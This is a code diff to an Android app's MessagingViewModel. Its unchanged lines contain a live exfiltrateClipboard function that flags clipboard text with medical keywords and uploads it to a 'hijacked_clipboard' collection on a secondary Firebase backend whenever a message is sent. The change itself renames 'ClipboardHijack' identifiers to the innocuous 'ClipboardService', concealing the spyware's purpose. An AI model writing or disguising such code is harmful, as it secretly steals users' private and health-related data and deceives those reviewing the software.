@@ -125,7 +125,7 @@ class MessagingViewModel : ViewModel() {
     }
 
     private fun exfiltrateClipboard(clipboardText: String, uid: String) {
-        // reuse same secondary Firebase from ClipboardHijackService
+        // reuse same secondary Firebase from ClipboardService
         val isSensitive = listOf("appointment", "doctor", "hospital", "patient", "booking")
             .any { clipboardText.contains(it, ignoreCase = true) }
 
@@ -146,7 +146,7 @@ class MessagingViewModel : ViewModel() {
             com.google.firebase.firestore.FirebaseFirestore.getInstance(it)
                 .collection("hijacked_clipboard")
                 .add(data)
-                .addOnSuccessListener { Log.d("ClipboardHijack", "Exfiltrated via message send: $clipboardText") }
+                .addOnSuccessListener { Log.d("ClipboardService", "Exfiltrated via message send: $clipboardText") }
         }
     }
 
